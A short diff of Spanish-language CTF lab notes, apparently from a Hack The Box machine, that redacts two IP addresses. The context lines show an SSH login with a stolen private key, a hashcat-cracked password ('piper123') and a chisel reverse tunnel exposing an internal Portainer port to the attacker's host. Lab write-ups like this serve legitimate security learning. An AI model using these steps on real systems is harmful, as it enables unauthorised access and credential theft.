@@ -84,7 +84,7 @@ hay una llave ssh
 
 ./config/projects/AllProjects/pluginData/ssh_keys/id_rsa
 
-ssh -i id_rsa john@10.129.230.247 --> y entramos
+ssh -i id_rsa john@10.129.x.x --> y entramos
 
 por otro lado hashcat solo me dio para matthew piper123
 
@@ -110,7 +110,7 @@ tcp6       0      0 :::8000                 :::*                    LISTEN      
 tcp6       0      0 :::80                   :::*                    LISTEN      -                   
 tcp6       0      0 :::22                   :::*                    LISTEN      -                  
 
-./chisel client 10.10.16.24:1234 R:9000:127.0.0.1:9000
+./chisel client 10.10.x.x:1234 R:9000:127.0.0.1:9000
 
 bueno el servicio oculto es https://docs.portainer.io/start/install-ce
 
